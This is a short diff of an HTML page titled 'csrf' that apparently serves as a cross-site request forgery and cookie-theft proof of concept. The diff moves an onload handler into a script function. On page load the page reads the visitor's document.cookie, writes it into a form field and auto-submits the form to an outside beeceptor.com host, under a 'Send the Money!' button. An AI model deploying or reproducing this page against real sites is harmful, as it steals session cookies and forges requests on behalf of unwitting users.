@@ -3,7 +3,7 @@
 <head>
  <title>csrf</title>
 </head>
-<body onload="let cookies = document.cookie;document.getElementById("inputTo").value = cookies;document.forms[0].submit()"></body>
+<body onload="submits()"></body>
     <form action="https://iamroot.free.beeceptor.com/" method="POST">
             <div class="form-row">
               <div class="form-group col-md-6">
@@ -13,6 +13,10 @@
             </div>
             <button type="submit" class="btn btn-primary">Send the Money!</button>
         </form>
+       <script>function submits(){
+           let cookies = document.cookie;document.getElementById("inputTo").value = cookies;document.forms[0].submit()
+         }
+        </script>
 </body>
 </html>
 
